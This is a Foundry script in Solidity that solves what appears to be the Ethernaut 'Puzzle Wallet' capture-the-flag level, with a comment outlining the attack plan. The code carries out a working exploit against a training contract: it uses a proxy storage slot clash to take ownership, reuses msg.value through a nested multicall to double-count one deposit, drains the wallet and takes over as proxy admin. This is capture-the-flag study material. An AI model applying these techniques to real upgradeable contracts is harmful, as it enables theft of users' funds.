// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {PuzzleProxy, PuzzleWallet} from "src/L24PuzzleWallet/L24PuzzleWallet.sol";

/**
 * Nowadays, paying for DeFi operations is impossible, fact.
 *
 * A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.
 *
 * They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
 *
 * Little did they know, their lunch money was at risk… *
 *   You'll need to hijack this wallet to become the admin of the proxy
 */

/**
 * @dev Attack method
 * 1. Change the pendingAdmin to my address, this in turn will change the owner of wallet to my address because of storage clashing
 * 2. Add my address to the whitelist
 * 3. deposit 0.001 ether to the wallet but using multicall to call deposit twice setting my balance to 0.002 ether but only sending 0.001 ether
 * 4. Call execute to withdraw 0.002 ether from the wallet
 * 5. Call setMaxBalance to set my address
 */
contract L24PuzzleWalletAttack is Script, Broadcast {
    address constant proxyAddress = 0xFF83615517140c6737E221a3383c4c27CF0AAAC1;

    // PuzzleWallet address
    address constant walletAddress = 0xFF83615517140c6737E221a3383c4c27CF0AAAC1;

    PuzzleProxy proxy = PuzzleProxy(payable(proxyAddress));
    PuzzleWallet wallet = PuzzleWallet(walletAddress);

    address constant myAddress = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function run() public broadcast {
        // Change pendingAmin to my address
        proxy.proposeNewAdmin(myAddress);
        console.log("New Owner", wallet.owner());

        // Owner changed to my address
        wallet.addToWhitelist(myAddress);

        bytes[] memory depositDataArray = new bytes[](1);
        bytes memory depositData = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        depositDataArray[0] = depositData;

        bytes[] memory multicallArray = new bytes[](2);
        multicallArray[0] = depositData;
        multicallArray[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, depositDataArray);

        // Using nested multicall to deposit 0.001 ether twice
        wallet.multicall{value: 0.001 ether}(multicallArray);

        console.log("My balance", wallet.balances(myAddress));

        // Withdraw 0.002 ether
        wallet.execute(myAddress, 0.002 ether, "");

        console.log("My new balance", wallet.balances(myAddress));
        console.log("Wallet balance", address(wallet).balance);

        // Set max balance to my address
        wallet.setMaxBalance(uint256(uint160(myAddress)));

        console.log("New admin:", proxy.admin());
    }
}
